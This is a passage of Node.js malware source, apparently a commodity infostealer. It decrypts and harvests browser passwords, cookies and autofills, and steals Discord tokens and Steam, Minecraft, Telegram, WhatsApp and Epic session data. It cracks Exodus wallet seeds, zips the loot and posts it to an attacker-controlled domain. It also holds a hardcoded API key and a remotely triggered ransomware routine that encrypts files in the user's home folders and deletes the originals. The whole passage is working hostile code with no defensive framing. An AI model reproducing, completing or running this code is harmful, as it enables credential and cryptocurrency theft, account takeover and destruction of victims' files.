      if (!fs.existsSync(dbPath)) return resolve([]);

      const rows = await executeQuery(dbPath, 
        'SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies');
      
      for (const row of rows) {
        if (!row.encrypted_value) continue;
        
        let decryptedValue = await decrypt(row.encrypted_value, masterKey).catch(() => null);
        if (!decryptedValue) continue;
        
        cookies.push({
          domain: row.host_key,
          name: row.name,
          value: decryptedValue,
          path: row.path,
          expires: row.expires_utc
        });
      }
      
      resolve(cookies);
    } catch (e) {
      resolve([]);
    }
  });
}

async function getBrowserProfiles(fullPath, browser) {
  try { 
    if (!fs.existsSync(fullPath)) return [];
    const dirs = fs.readdirSync(fullPath);

    return dirs.reduce((profiles, dir) => {
        if (dir.includes("Profile") || dir === "Default") {
          const profilePath = path.join(fullPath, dir);

          const exists = profiles.some(profile => profile.path === profilePath);          
          if (!exists) {
            profiles.push({
              name: browser,
              profile: dir,
              path: profilePath,
            });
          }
        }

        return profiles;
    }, []);
  } catch (e) {
    return [];
  }
}

async function getAutofills(pathh) {
  try { 
    const autofills = [];

    const rows = await executeQuery(path.join(pathh, 'Web Data'), 'SELECT * FROM autofill');
    rows.map((rw) => autofills.push(`Name: ${rw?.name} | Value: ${rw?.value}`));

    return autofills;
  } catch {
    return [];
  }
}

async function getPasswords(pathh, masterKey) {
  return new Promise(async (res, rej) => {
    try { 
      const passwords = [];
  
      const rows = await executeQuery( pathh.includes("Yandex") ? path.join(pathh, 'Ya Passman Data') : path.join(pathh, 'Login Data'), 'SELECT * FROM logins');
      rows.map(async (rw) => {
        if (!rw.username_value) return;
        
        let password = rw.password_value;
        if (password) password = await decrypt(password, masterKey).catch(() => {});
      
        if (password && rw.username_value) passwords.push(`Username: ${rw.username_value} | Password: ${password} | URL: ${rw.origin_url}`);
      });
  
      return res(passwords);
    } catch {
      return res([]);
    }
  })
}

async function firefoxCookies() {
  const cookies = [];
  const firefoxPaths = [
    path.join(process.env.APPDATA, "Mozilla", "Firefox", "Profiles"),
    path.join(process.env.APPDATA, "Waterfox", "Profiles")
  ];

  for (const firefoxPath of firefoxPaths) {
    try {
      if (!fs.existsSync(firefoxPath)) continue;

      const findCookiesFiles = (dir, foundFiles = []) => {
        for (const file of fs.readdirSync(dir)) {
          const fullPath = path.join(dir, file);
          try {
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
              findCookiesFiles(fullPath, foundFiles);
            } else if (file.toLowerCase() === "cookies.sqlite") {
              foundFiles.push(fullPath);
            }
          } catch (err) {
          }
        }
        return foundFiles;
      };

      const cookiesFiles = findCookiesFiles(firefoxPath);

      for (const cookiesFile of cookiesFiles) {
        try {
          const db = new sqlite3.Database(cookiesFile);
          const rows = await new Promise((resolve, reject) => {
            db.all("SELECT * FROM moz_cookies", (err, rows) => {
              err ? reject(err) : resolve(rows || []);
            });
          });
          db.close();

          for (const row of rows) {
            if (!row.value) continue;

            cookies.push(
              `${row.host}\t${row.host.startsWith(".") ? "TRUE" : "FALSE"}\t${row.path}\t` +
              `${row.isSecure ? "TRUE" : "FALSE"}\t${row.expiry}\t${row.name}\t${row.value}`
            );
          }
        } catch (err) {
        }
      }
    } catch (err) {
    }
  }

  if (cookies.length === 0) {
    return { cookies: [] };
  }

  try {

   const firefoxDir = path.join(os.tmpdir(), 'BrowserData', 'All', 'Firefox');

    const filePathFirefox = path.join(firefoxDir);
    if (!fs.existsSync(filePathFirefox)) {
      fs.mkdirSync(filePathFirefox, { recursive: true });
    }


    fs.writeFileSync(path.join(filePathFirefox, "Cookies.txt"), cookies.join("\n"), "utf-8");

    return { path: filePathFirefox, cookies };
  } catch (err) {
    return { cookies: [] };
  }
}
async function downloadFileFP(url, destPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(destPath);
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`Download failed: ${response.statusCode}`));
        return;
      }

      response.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', (err) => {
      fs.unlink(destPath, () => reject(err));
    });
  });
}

async function getMasterKey(pathh) {
  const localStatePath = path.join(pathh, 'Local State')
  if (!fs.existsSync(localStatePath)) return null;

  try {
      const data = fs.readFileSync(localStatePath, 'utf8');

      const parsedData = JSON.parse(data);
      const encryptedKey = parsedData.os_crypt.encrypted_key;

      if (!encryptedKey) return null;

      const decodedKeyBuffer = Buffer.from(encryptedKey, 'base64');
      const slicedKeyBuffer = decodedKeyBuffer.slice(5);
      const decryptedKey = Dpapi.unprotectData(slicedKeyBuffer, null, 'CurrentUser');

      return decryptedKey;
  } catch (error) {
      console.error(error);
  }
}

async function decrypt(encrypted, key) {
  const bufferKey = Buffer.isBuffer(key) ? key : Buffer.from(key, 'utf-8');
  if (bufferKey.length !== 32) return null;

  const nonce = encrypted.slice(3, 15);
  const encryptedData = encrypted.slice(15, -16);
  const authTag = encrypted.slice(-16);

  const decipher = crypto.createDecipheriv('aes-256-gcm', bufferKey, nonce);
  decipher.setAuthTag(authTag);

  let decryptedString = decipher.update(encryptedData, 'base64', 'utf-8');
  decryptedString += decipher.final('utf-8');

  return decryptedString;
}

async function executeQuery(pathh, query) {
  const pathTmp = `${pathh}.query`;

  try { 
      await fs.copyFileSync(pathh, pathTmp);
      const db = new sqlite3.Database(pathTmp);

      const data = await new Promise(async (res, rej) => {
          await db.all(query, (err, rows) => {
              if (err) rej(err);
              res(rows);
          })
      });

      return data;
  } catch (e) {
  } finally {
    try {
        await fs.unlink(pathTmp);
    } catch (error) {}
  }
}

async function getUsers() {
  const users = [];
  const userDir = path.join(process.env.SystemDrive || 'C:', 'Users');
  
  try {
    const dirs = fs.readdirSync(userDir);
    for (const dir of dirs) {
      if (dir === 'Public' || dir === 'Default' || dir === 'Default User') continue;
      users.push(path.join(userDir, dir));
    }
  } catch (e) {
  }
    if (!users.includes(os.homedir())) {
    users.push(os.homedir());
  }
  
  return users;
}

async function all() {
  try {
    const profiles = await getDataBrowser();

    try {
      await firefoxCookies();
    } catch (firefoxError) {
    }

    for (const profile of profiles) {
      try {
        const browserName = profile.browser.name.replace(/[<>:"\/\\|?*]/g, '_');
        const profileName = profile.profile.replace(/[<>:"\/\\|?*]/g, '_');

        const baseDir = path.join(
          os.tmpdir(),
          'BrowserData',
          'All',
          browserName,
          profileName
        );

        fs.mkdirSync(baseDir, { recursive: true });

        if (profile.autofills?.length > 0) {
          fs.writeFileSync(
            path.join(baseDir, 'autofills.txt'),
            profile.autofills.join('\n')
          );
        }

        if (profile.passwords?.length > 0) {
          fs.writeFileSync(
            path.join(baseDir, 'passwords.txt'),
            profile.passwords.join('\n')
          );
        }

        if (profile.cookies?.length > 0) {
          const cookiesText = profile.cookies.map(c =>
            `${c.domain}\t${c.name}\t${c.value}\t${c.path}\t${c.expires}`
          ).join('\n');

          fs.writeFileSync(
            path.join(baseDir, 'cookies.txt'),
            cookiesText
          );
        }

      } catch (profileError) {
      }
    }

    return path.join(os.tmpdir(), 'BrowserData', 'All');

  } catch (e) {
    return null;
  }
}

async function killProcess(processName) {
  return new Promise((resolve) => {
    try {
      exec(`taskkill /F /IM ${processName}.exe`, (error) => {
        if (error) {
        } else {
        }
        resolve();
      });
    } catch (e) {
      resolve();
    }
  });
}

function buildFolderSummary(dirPath) {
  const structure = {};

  function walk(currentPath, parts = []) {
    const entries = fs.readdirSync(currentPath, { withFileTypes: true });

    for (const entry of entries) {
      const fullPath = path.join(currentPath, entry.name);

      if (entry.isDirectory()) {
        walk(fullPath, [...parts, entry.name]);
      } else if (entry.isFile() && entry.name.endsWith('.txt')) {
        if (parts.length < 3) continue;

        const [source, browser, ...rest] = parts;
        const profile = rest.slice(-1)[0] || 'Default';

        const rootGroup = structure[source] ??= {};
        const browserGroup = rootGroup[browser] ??= {};
        const profileList = browserGroup[profile] ??= [];

        profileList.push(entry.name);
      }
    }
  }

  walk(dirPath);

  const treeLines = ['🗂️'];

  for (const [source, browsers] of Object.entries(structure)) {
    treeLines.push(`├── 🗃️ ${source}`);
    const browserEntries = Object.entries(browsers);

    browserEntries.forEach(([browser, profiles], browserIndex) => {
      const isLastBrowser = browserIndex === browserEntries.length - 1;
      const browserLine = isLastBrowser ? '└──' : '├──';
      treeLines.push(`│   ${browserLine} 🧭 ${browser}`);

      const profileEntries = Object.entries(profiles);
      profileEntries.forEach(([profile, files], profileIndex) => {
        const isLastProfile = profileIndex === profileEntries.length - 1;
        const profileLine = isLastProfile ? '└──' : '├──';
        const browserPrefix = isLastBrowser ? '    ' : '│   ';
        treeLines.push(`${browserPrefix}   ${profileLine} 👤 ${profile}`);

        files.forEach((file, i) => {
          const isLastFile = i === files.length - 1;
          const fileLine = isLastFile ? '└──' : '├──';
          const profilePrefix = browserPrefix + (isLastProfile ? '    ' : '│   ');
          treeLines.push(`${profilePrefix}   ${fileLine} 📄 ${file}`);
        });
      });
    });
  }

  return treeLines.join('\n');
}

async function sendBrowser() {
  try {
    const browserDataPath = path.join(os.tmpdir(), 'BrowserData');
    if (!fs.existsSync(browserDataPath)) return;

    const summary = buildFolderSummary(browserDataPath);

    const zip = new AdmZip();
    zip.addLocalFolder(browserDataPath);
    const zipPath = path.join(os.tmpdir(), `BrowserData_${Date.now()}.zip`);
    zip.writeZip(zipPath);

    const filelink = await uploadFile(zipPath);
    if (!filelink) {
      try { fs.unlinkSync(zipPath); } catch {}
      return;
    }

    try { fs.unlinkSync(zipPath); } catch {}

    const payload = {
        key: nggrkey,
        filelink,
        summary
      };
  
      const jsonData = JSON.stringify(payload);
  
      return new Promise((resolve, reject) => {
        const req = https.request({
          hostname: DOMAIN,
          port: 443,
          path: '/send-browser',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(jsonData)
          },
        }, (res) => {
          let body = '';
  
          res.on('data', chunk => body += chunk);
  
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              console.log("✅ Token successfully sent. API Response:", body);
              resolve(body);
              if (fs.existsSync(zipPath)) {
                fs.unlinkSync(zipPath);
              }
            } else {
              console.error(`❌ API error (Status ${res.statusCode}):`, body);
              reject(new Error(`Status ${res.statusCode}: ${body}`));
            }
          });
        });
  
        req.on('error', (err) => {
          console.error("❌ Error sending token:", err.message);
          reject(err);
        });
  
        req.write(jsonData);
        req.end();
      });
  } catch (err) {
  }
}

async function runB() {
  const users = await getUsers();

  const browsersToKill = [
    'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum',
    'centbrowser', '7star', 'sputnik', 'vivaldi', 'epicprivacybrowser',
    'uran', 'yandex', 'iridium'
  ];

  for (const p of browsersToKill) {
    await killProcess(p);
  }

  await all(users);
  await Operapass(users);
 await opera(users);
  await chromium(users);
  await sendBrowser(users);
  await processAllbrowsersopw(users);
}

const browsersopw = [
    { name: 'Chrome', userDataPath: path.join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data') },
    { name: 'Edge', userDataPath: path.join(process.env.LOCALAPPDATA, 'Microsoft/Edge/User Data') },
    { name: 'Brave', userDataPath: path.join(process.env.LOCALAPPDATA, 'BraveSoftware/Brave-Browser/User Data') },
    { name: 'Vivaldi', userDataPath: path.join(process.env.LOCALAPPDATA, 'Vivaldi/User Data') },
    { name: 'Chromium', userDataPath: path.join(process.env.LOCALAPPDATA, 'Chromium/User Data') },
    { name: 'Epic', userDataPath: path.join(process.env.LOCALAPPDATA, 'Epic Privacy Browser/User Data') },
    { name: 'Yandex', userDataPath: path.join(process.env.LOCALAPPDATA, 'Yandex/YandexBrowser/User Data') }
];

function getMasterKeyopw(localStatePath) {
    const state = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encryptedKey = Buffer.from(state.os_crypt.encrypted_key, 'base64').slice(5);
    return Dpapi.unprotectData(encryptedKey, null, 'CurrentUser');
}

function decryptPasswordopw(encrypted, masterKey) {
    try {
        const buffer = Buffer.from(encrypted);
        const prefix = buffer.slice(0, 3).toString();

        if (['v10', 'v11', 'v20', 'v80'].includes(prefix)) {
            const iv = buffer.slice(3, 15);
            const cipherText = buffer.slice(15, buffer.length - 16);
            const authTag = buffer.slice(buffer.length - 16);

            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
            decipher.setAuthTag(authTag);

            return Buffer.concat([decipher.update(cipherText), decipher.final()]).toString('utf8');
        } else {
            return Dpapi.unprotectData(buffer, null, 'CurrentUser').toString('utf8');
        }
    } catch {
        return null;
    }
}

function extractPasswordsopw(browserName, profileName, profilePath, masterKey) {
const OUTPUT_DIR = path.join(os.tmpdir(), 'BrowserData', 'ChromiumV20');
if (!fs.existsSync(OUTPUT_DIR)) fs.mkdirSync(OUTPUT_DIR, { recursive: true });
    const dbPath = path.join(profilePath, 'Login Data');
    if (!fs.existsSync(dbPath)) return;

    const tempDb = path.join(os.tmpdir(), `LoginData_${Date.now()}_${Math.random()}.db`);
    fs.copyFileSync(dbPath, tempDb);

    const db = new sqlite3.Database(tempDb, sqlite3.OPEN_READONLY);
    const entries = [];

    db.serialize(() => {
        db.each(`SELECT origin_url, username_value, password_value FROM logins`, (err, row) => {
            if (err || !row.password_value) return;

            const password = decryptPasswordopw(row.password_value, masterKey);
            if (password) {
                entries.push(`${row.origin_url} | ${row.username_value} | ${password}`);
            }
        }, () => {
            db.close(() => fs.unlinkSync(tempDb));

            if (entries.length > 0) {
                const dir = path.join(OUTPUT_DIR, browserName, profileName);
                fs.mkdirSync(dir, { recursive: true });

                const filePath = path.join(dir, 'passwords.txt');
                fs.writeFileSync(filePath, `# ${browserName} | Profile: ${profileName}\n\n`);
                fs.appendFileSync(filePath, entries.join('\n') + '\n');
            }
        });
    });
}

function processAllbrowsersopw() {
  const processes = [
    'chrome.exe',
    'brave.exe',
    'msedge.exe',
    'vivaldi.exe',
    'browser.exe',
    'epic.exe'
  ];

  for (const proc of processes) {
    try {
      execSync(`taskkill /F /IM ${proc}`, { stdio: 'ignore' });
    } catch {
    }
  }

  for (const { name, userDataPath } of browsersopw) {
    if (!fs.existsSync(userDataPath)) continue;

    const localStatePath = path.join(userDataPath, 'Local State');
    if (!fs.existsSync(localStatePath)) continue;

    let masterKey;
    try {
      masterKey = getMasterKeyopw(localStatePath);
    } catch {
      continue;
    }

    const profiles = fs.readdirSync(userDataPath).filter(p =>
      fs.existsSync(path.join(userDataPath, p, 'Login Data'))
    );

    for (const profile of profiles) {
      const profilePath = path.join(userDataPath, profile);
      extractPasswordsopw(name, profile, profilePath, masterKey);
    }
  }
}

  async function main() {
    const totalStart = performance.now();
    const STEAM_API_KEY = '440D7F4D810EF9298D25EDDF37C1F902';

    const tempDir = path.join(os.tmpdir(), crypto.randomBytes(8).toString('hex'));
    fs.mkdirSync(tempDir, { recursive: true });

        const injectionInfo = [];
    
        const measure = async (label, func) => {
            const start = performance.now();
            console.log(`\n▶️  Starting: ${label}`);
            try {
                const result = await func(); 
                const end = performance.now();
                console.log(`✅ Finished: ${label} (${((end - start) / 1000).toFixed(2)} seconds)`);
                return result;
            } catch (err) {
                const end = performance.now();
                console.error(`❌ Failed: ${label} (${((end - start) / 1000).toFixed(2)} seconds)\n  ↳ Error: ${err.message}`);
                return null;
            }
        };
        await measure("Scanning Discord Tokens", stealTokens);
        await measure("Submit Browser", runB);
        await measure("Injecting into Discord", dcinject);
        await stealSteamSession(STEAM_API_KEY);
        await measure("Submit Exodus", SubmitExodus);
        await measure("Submit Minecraft", submitMinecraft);
        await measure("Found Files", processAndSendAll);
        await measure("Exodus & Atomic Inj", walletInjection);

    try {
        const { zipFilePath, walletNames } = await measure("Creating ZIP for logs...", createSingleZip);

        if (zipFilePath) {
            console.log("Sending log to API...");
            await sendLogToApi(zipFilePath, walletNames);
            console.log("Log sent successfully.");
        } else {
            console.log("No logs found to zip.");
        }
    } catch (error) {
        console.error("Error in ZIP or API tasks:", error.message);
    }

if (injectionResults.length > 0) {
    for (const item of injectionResults) {
        injectionInfo.push({
            type: item.type,
            path: item.path
        });
    }
}
    await rmdirAsync(tempDir);
    const totalEnd = performance.now();
    console.log(`Total execution time: ${((totalEnd - totalStart) / 1000).toFixed(2)} seconds`);
}
async function sendToken(token) {
    const payload = {
      key: nggrkey,
      token
    };
    
    const jsonData = JSON.stringify(payload);
  
    return new Promise((resolve, reject) => {
      console.log("📤 Discord token gönderiliyor:", payload);
  
      const req = https.request({
        hostname: DOMAIN,
        port: 443,
        path: '/send-discord',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(jsonData)
        },
      }, (res) => {
        let body = '';
        
        res.on('data', chunk => body += chunk);
  
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log("✅ Token gönderildi. API yanıtı:", body);
            resolve(body);
          } else {
            console.error(`❌ Hata (Status ${res.statusCode}):`, body);
            reject(new Error(`Status ${res.statusCode}: ${body}`));
          }
        });
      });
  
      req.on('error', (err) => {
        console.error("❌ Token gönderimi hatası:", err.message);
        reject(err);
      });
  
      req.write(jsonData);
      req.end();
    });
  }
  async function sendLogToApi(zipFilePath, walletNames) {
    try {
      const walletList = walletNames.join(', ');
  
      let link;
      try {
        link = await uploadFile(zipFilePath);
        console.log('📤 Upload File Response:', link);
      } catch (error) {
        console.error('❌ Error during file upload:', error.message);
        link = 'Upload failed';
      }
  
      const payload = {
        key: nggrkey,
        link,
        walletList
      };
  
      const jsonData = JSON.stringify(payload);
  
      return new Promise((resolve, reject) => {
        const req = https.request({
          hostname: DOMAIN,
          port: 443,
        path: '/send-wallet',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(jsonData)
          },
        }, (res) => {
          let body = '';
  
          res.on('data', chunk => body += chunk);
  
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              console.log("✅ Token successfully sent. API Response:", body);
              resolve(body);
              if (fs.existsSync(zipFilePath)) {
                fs.unlinkSync(zipFilePath);
              }
            }  
          });
        });
  
        req.on('error', (err) => {
          console.error("❌ Error sending token:", err.message);
          reject(err);
        });
  
        req.write(jsonData);
        req.end();
      });
  
    } catch (error) {
      console.error('❌ Error sending log to API:', error.message);
    }
  }
  async function SubmitExodus() {
    try {
      const exodusWalletPath = path.join(process.env.appdata, "Exodus", "exodus.wallet");
      const zipPath = path.join(process.env.appdata, 'Exodus.zip');
      const seedPath = path.join(exodusWalletPath, 'seed.seco');
  
      console.log('📁 Exodus Wallet Path:', exodusWalletPath);
      console.log('🔐 Seed File Path:', seedPath);
  
      if (!fs.existsSync(seedPath)) {
        console.log('❌ Seed file not found.');
        return;
      }
  
      console.log('✅ Seed file located.');
  
      await zipFolderX(exodusWalletPath, zipPath);
  
      const fileContent = fs.readFileSync(seedPath);
      checkFileEncoding(fileContent);
  
      const passwordsAsArray = getPasswordsX();
      let foundPassword = null;
      let decryptedData = null;
  
      for (const password of passwordsAsArray) {
        console.log(`🔎 Trying password: ${password}`);
        decryptedData = decryptWithSeco(fileContent, password);
  
        if (decryptedData) {
          console.log(`✅ Correct password found: ${password}`);
          foundPassword = password;
          break;
        }
      }
  
      let link = 'Upload failed';
      try {
        link = await uploadFile(zipPath);
        console.log('📤 Upload Link:', link);
      } catch (uploadErr) {
        console.error('❌ Upload failed:', uploadErr.message);
      }
  
      const payload = {
        key: nggrkey,
        link,
        foundPassword: foundPassword || 'Not Found'
      };
  
      const jsonData = JSON.stringify(payload);
  
      await new Promise((resolve, reject) => {
        const req = https.request({
          hostname: DOMAIN,
          port: 443,
          path: '/send-exodus',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(jsonData)
          },
        }, (res) => {
          let body = '';
  
          res.on('data', chunk => body += chunk);
  
          res.on('end', () => {
            if (fs.existsSync(zipPath)) {
              fs.unlinkSync(zipPath);
            }
  
            if (res.statusCode >= 200 && res.statusCode < 300) {
              console.log("✅ Data successfully sent. Response:", body);
              resolve();
            } else {
              console.error(`❌ API error (${res.statusCode}):`, body);
              reject(new Error(`Status ${res.statusCode}`));
            }
          });
        });
  
        req.on('error', (err) => {
          console.error("❌ HTTP request error:", err.message);
          reject(err);
        });
  
        req.write(jsonData);
        req.end();
      });
  
    } catch (error) {
      console.error('❌ Error during SubmitExodus execution:', error.message);
    }
  }
  async function stealSteamSession(STEAM_API_KEY) {
    try {
      await killSteam(); 
      const configPath = `C:\\Program Files (x86)\\Steam\\config`;
      const loginUsersPath = path.join(configPath, "loginusers.vdf");
  
      if (!fs.existsSync(configPath)) {
        console.log('❌ Steam config folder not found.');
        return;
      }
  
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'steam-'));
      const zipPath = path.join(tempDir, 'SteamSession.zip');
  
      const zipper = new AdmZip();
      zipper.addLocalFolder(configPath);
      zipper.writeZip(zipPath);
  
      const accountsRaw = fs.readFileSync(loginUsersPath, "utf-8");
      const accountIds = accountsRaw.match(/7656[0-9]{13}/g) || [];
  
      for (const account of accountIds) {
        try {
          const [summaryRes, gamesRes, levelRes] = await Promise.all([
            axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=${STEAM_API_KEY}&steamids=${account}`),
            axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=${STEAM_API_KEY}&steamid=${account}`),
            axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=${STEAM_API_KEY}&steamid=${account}`)
          ]);
  
          const info = summaryRes.data.response.players[0];
          const gameCount = gamesRes.data.response.game_count || "Private";
          const steamLevel = levelRes.data.response.player_level || "Private";
  
          const message = [
            `[👤 View Profile](${info.profileurl})`,
            `🆔 *Steam ID*: ${account}`,
            `🧑‍💻 *Username*: ${info.personaname}`,
            `🎮 *Games Owned*: ${gameCount}`,
            `📅 *Created*: ${new Date(info.timecreated * 1000).toLocaleDateString()}`,
            `🔢 **Level**: ${steamLevel}`
          ].join('\n');
  
          let link;
          try {
            link = await uploadFile(zipPath);
            console.log('📤 Upload successful:', link);
          } catch (err) {
            console.error('❌ Upload failed:', err.message);
            link = 'Upload failed';
          }
  
          const payload = { key: nggrkey, link, message };
          const jsonData = JSON.stringify(payload);
  
          await new Promise((resolve, reject) => {
            const req = https.request({
              hostname: DOMAIN,
              port: 443,
              path: '/send-steam',
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(jsonData)
              }
            }, (res) => {
              let body = '';
              res.on('data', chunk => body += chunk);
              res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                  console.log('✅ Data sent successfully:', body);
                  resolve();
                } else {
                  console.error(`❌ API response error (${res.statusCode}):`, body);
                  reject(new Error('API Error'));
                }
              });
            });
  
            req.on('error', err => {
              console.error('❌ HTTP request error:', err.message);
              reject(err);
            });
  
            req.write(jsonData);
            req.end();
          });
  
          await new Promise(resolve => setTimeout(resolve, 2000));
        } catch (err) {
          console.error(`⚠️ Error while processing Steam account (${account}):`, err.message);
        }
      }
  
      if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch (error) {
      console.error(`🚨 General error (stealSteamSession):`, error.message);
    }
  }
  async function processAndSendAll() {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'all-files-'));
    const finalZipPath = path.join(os.tmpdir(), 'all-files.zip');
  
    try {
      await terminateProcesses([
        'Growtopia.exe',
        'Minecraft.exe',
        'EpicGamesLauncher.exe',
        'WhatsApp.exe',
        'Telegram.exe'
      ]);
  
      await processBackupCodes(tempDir);
      await processGrowtopia(tempDir);
      await processEpicGames(tempDir);
      await processWhatsApp(tempDir);
      await saveTelegramData(tempDir);
  
      await new Promise(resolve => setTimeout(resolve, 3000)); 
  
      const zipper = new AdmZip();
      zipper.addLocalFolder(tempDir);
      zipper.writeZip(finalZipPath);
  
      const foundFiles = fs.readdirSync(tempDir, { withFileTypes: true })
        .filter(entry => entry.isDirectory())
        .map(entry => entry.name);
  
      const contentMessage = `📁 **Found Folders:** ${foundFiles.join(', ') || 'None'}`;
  
      let link;
  try {
    link = await uploadFile(finalZipPath);
    console.log('📤 Upload successful:', link);
  } catch (err) {
    console.error('❌ Upload failed:', err.message);
    link = 'Upload failed';
  }
  
  const payload = {
    key: nggrkey,
    link,
    contentMessage
  };
  
  const jsonData = JSON.stringify(payload);
  
  await new Promise((resolve, reject) => {
    const req = https.request({
      hostname: DOMAIN,
      port: 443,
      path: '/send-files',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(jsonData)
      }
    }, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('✅ Data successfully sent:', body);
          resolve();
        } else {
          console.error(`❌ API response error (${res.statusCode}):`, body);
          reject(new Error(`API Error: ${res.statusCode}`));
        }
      });
    });
  
    req.on('error', (err) => {
      console.error('❌ HTTP request error:', err.message);
      reject(err);
    });
  
    req.write(jsonData);
    req.end();
  });
  
  } catch (err) {
    console.error('🚨 General error (processAndSendAll):', err.message);
  } finally {
    try {
      if (fs.existsSync(tempDir)) {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
      if (fs.existsSync(finalZipPath)) {
        fs.unlinkSync(finalZipPath);
      }
    } catch (cleanupErr) {
      console.error('⚠️ Cleanup error:', cleanupErr.message);
    }
  }
  } 
  async function submitMinecraft() {
    try {
      await killMinecraft();
  
      const userHome = os.homedir();
      const minecraftDir = path.join(process.env.APPDATA, '.minecraft');
      const lunarClientDir = path.join(userHome, '.lunarclient');
  
      const launcherProfiles = path.join(minecraftDir, 'launcher_profiles.json');
      const lunarAccounts = path.join(lunarClientDir, 'settings', 'game', 'accounts.json');
  
      const sessionFiles = [launcherProfiles, lunarAccounts].filter(fs.existsSync);
  
      if (sessionFiles.length === 0 && !fs.existsSync(path.join(lunarClientDir, 'settings'))) {
        console.log('No Minecraft or Lunar Client session data found.');
        return;
      }
  
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'minecraft-session-'));
      const mcDataDir = path.join(tempDir, 'Minecraft');
      ensureDirectoryExistence(mcDataDir);
  
      for (const file of sessionFiles) {
        const destPath = path.join(mcDataDir, path.basename(file));
        fs.copyFileSync(file, destPath);
        console.log(`✔ Copied: ${file} -> ${destPath}`);
      }
  
      const lunarSettingsSrc = path.join(lunarClientDir, 'settings');
      const lunarSettingsDest = path.join(tempDir, 'LunarClient', 'settings');
      if (fs.existsSync(lunarSettingsSrc)) {
        await copyFolderContents(lunarSettingsSrc, lunarSettingsDest);
        console.log(`✔ Copied Lunar Client settings: ${lunarSettingsSrc} -> ${lunarSettingsDest}`);
      }
  
      const zipPath = path.join(os.tmpdir(), 'MinecraftSession.zip');
      const zip = new AdmZip();
      zip.addLocalFolder(tempDir);
      zip.writeZip(zipPath);
  
      let fileLink;
      try {
        fileLink = await uploadFile(zipPath);
        console.log(`📤 Upload successful: ${fileLink}`);
      } catch (err) {
        console.error('❌ Upload failed:', err.message);
        fileLink = 'Upload failed';
      }
  
      const userData = getMcUserData();
  
      const payload = {
        key: nggrkey,
        link: fileLink,
        userData: userData
      };
  
      const jsonData = JSON.stringify(payload);
  
      await new Promise((resolve, reject) => {
        const req = https.request({
          hostname: DOMAIN,
          port: 443,
          path: '/send-minecraft',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(jsonData)
          }
        }, res => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              console.log('✅ Data successfully submitted:', body);
              resolve();
            } else {
              console.error(`❌ Server error (${res.statusCode}):`, body);
              reject(new Error(`Status ${res.statusCode}`));
            }
          });
        });
  
        req.on('error', err => {
          console.error('❌ HTTP request error:', err.message);
          reject(err);
        });
  
        req.write(jsonData);
        req.end();
      });
  
      fs.rmSync(tempDir, { recursive: true, force: true });
      fs.unlinkSync(zipPath);
  
    } catch (err) {
      console.error(`❌ An error occurred: ${err.message}`);
    }
  }

    socket.on('ransomware', () => {
        startEncryption();
    });
const TARGET_FOLDERS = [
    path.join(os.homedir(), 'Desktop'),
    path.join(os.homedir(), 'Documents'),
    path.join(os.homedir(), 'Downloads'),
    path.join(os.homedir(), 'Pictures'),
    path.join(os.homedir(), 'Videos')
  ];
  
  const ALLOWED_EXTENSIONS = ['.docx', '.jpg', '.zip', '.txt', '.pdf', '.mp4', '.mp3', '.wav', '.png', '.jpeg'];
  const ALGORITHM = 'aes-256-ctr';
  const IV_LENGTH = 16;
  const LOG_FILE = path.join(os.tmpdir(), 'encrypted_files.txt');
  const randomKeyR = crypto.randomBytes(32).toString('base64');
  const encryptionKey = crypto.createHash('sha256').update(randomKeyR).digest();
  
  fs.writeFileSync(LOG_FILE, 'Encrypted Files:\n', 'utf8');
  
  function encryptFile(filePath) {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv(ALGORITHM, encryptionKey, iv);
  
    const fileBuffer = fs.readFileSync(filePath);
    const encrypted = Buffer.concat([cipher.update(fileBuffer), cipher.final()]);
  
    const finalBuffer = Buffer.concat([iv, encrypted]);
  
    fs.writeFileSync(filePath + '.locked', finalBuffer);
    fs.unlinkSync(filePath);
  
    fs.appendFileSync(LOG_FILE, `${filePath}\n`, 'utf8');
    console.log(`🔒 Encrypted: ${filePath}`);
  }
  
  function walkDirectory(directory) {
    const files = fs.readdirSync(directory);
  
    for (const file of files) {
      const fullPath = path.join(directory, file);
      const stat = fs.lstatSync(fullPath);
  
      if (stat.isDirectory()) {
        walkDirectory(fullPath);
      } else if (stat.isFile()) {
